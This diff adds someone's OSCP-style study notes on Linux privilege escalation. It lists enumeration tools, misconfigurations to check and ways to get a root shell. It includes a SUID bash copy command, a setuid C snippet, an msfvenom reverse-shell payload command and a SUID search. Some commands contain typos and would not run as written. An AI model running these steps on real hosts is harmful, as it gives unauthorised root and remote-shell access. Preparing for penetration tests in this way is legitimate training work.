@@ -1,0 +1,101 @@
+https://github.com/Esot3riC/OSCP-prep/blob/main/PrivilegeEscalation/Linux/linuxPrivEsc.pdf
+
+
+
+# Techniqe To Swaping Root Shell:-----
+    1. "rootbash" SUID:- create copy of /bin/bash. owned by root and SUID bit set.
+           1.1 select do_system('cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash)  run:- /tmp/rootbash -p
+           1.2 
+
+    2. Custom Executables:- instance where root process execute another process which can be controled.
+           2.1  int main() {
+                    setuid(0);
+                    system("/bin/bash -p");
+                }
+
+            Compile using: $ gcc -o <name> <filename.c>
+
+    3. msfvenom:- for reverse shell use msfvenom to generate executable file (.elf)
+            3.1 msfvenom -p linux/x86/shell_reverse_tcp LHOST= LPOST= -f elf > shell.elf
+                use NETCAT or multi/handlre to caught reverse shell.
+
+    4. Native Reverse Shell:- https://github.com/mthbernardes/rsg tool
+                use NETCAT to caught reverse shell.
+
+
+#Tools:----
+
+    1. Tools for enumeration:--
+            1.1. lse.sh (Linux Smart enumuration):- Bash script
+                  https://github.com/diego-treitos/linux-smart-enumeration
+
+            1.2. LinEnum:- advance, copy intresting files, search for files contain keyword e.g. passwd
+                  https://github.com/rebootuser/LinEnum
+
+            1.3  other tools:- 
+                  https://github.com/linted/linuxprivchecker (python)
+                  https://github.com/AlessandroZ/BeRoot
+                  http://pentestmonkey.net/tools/audit/unix-privesc-check
+
+            1.4 (important manual checklist) 
+                 https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+
+            1.5 Linux Exploit suggester:-
+                 https://github.com/jondonas/linux-exploit-suggester-2
+                       ./linux-exploit-suggester-2.pl -k 2.6.32    
+
+
+
+#Exploits:---
+
+    1.  Weak File Permissions:-- Run lse.sh or ls -l /etc shadow
+             1.1 /etc/shadow 
+             1.2 /etc/passwd
+             1.3 Backup files:-  /root, /tmp, /var/backups, /var/logs, history file
+             1.4 Hidden files in common location
+
+    2. sudo:--  Run lse.sh or sudo -l(list of program user is allowed to run via sudo)
+             2.1 Known Password
+             2.2 other ways commands($ sudo-s, $ sudo-i, $ sudo/bin/bash, $ sudopasswd)
+             2.3 Shell Escape Sequences: check video https://gtfobins.github.io/
+             2.4 Abusing Intended Functionality: check video
+             2.5  Environment Variables (LD_PRELOAD and LD_LIBRARY_PATH)
+
+    3. Cron Jobs:-- Run lse.sh or  cat /etc/crontab (check whe cron job is running every minut or day)
+              3.1 File Permissions (write Permissions)
+              3.2 Path Environment Variables (if full or absolute path is not given to file or program)
+              3.3 Wildcards * 
+
+    4. SUID / SGID Executables:-- Run lse.sh or find / -type f -a \( -perm -u+s-o -perm -g+s\) -exec ls -l {} \; 2> /dev/null 
+              4.1 Shell Escape Sequences
+              4.2 Known Exploits
+              4.3 Shared object Injection
+              4.4 Path Environment Variables (absolute path)         
+              4.5 Abusing shell features (if Bash version < 4.2-048)
+              4.6 Abusing shell features (if Bash version < 4.4)  
+
+    5. Password & Keys:-- if week passwd storage or re-use root Password
+              5.1 History files (locate history)
+              5.2 Config file 
+              5.3 SSH Keys
+
+    6. NFS (network file system):-- Run lse.sh or cat /etc/exports (Output contains= no_root_squash)  
+              6.1 root squashing 
+
+    7. Service Exploits:-- Run lse.sh or ps aux | grep "^root"
+            7.1 Enumurate program version and exploit some time needs 7.2
+            7.2 post forwarding  
+
+    8. Exploit kernel :- uname -a                                      
+                                                                                 
+
+#commands:---
+
+     1. Check we can login to root using SSH:-
+          $ grep PermitRootLogin /etc/ssh/sshd_config
+
+     2. ^M means exploit code written using window new line charactes: it casuse error to compli an exploit
+           $ sed -e "s/^M//" 39535.sh > privesc.sh
+
+
+           
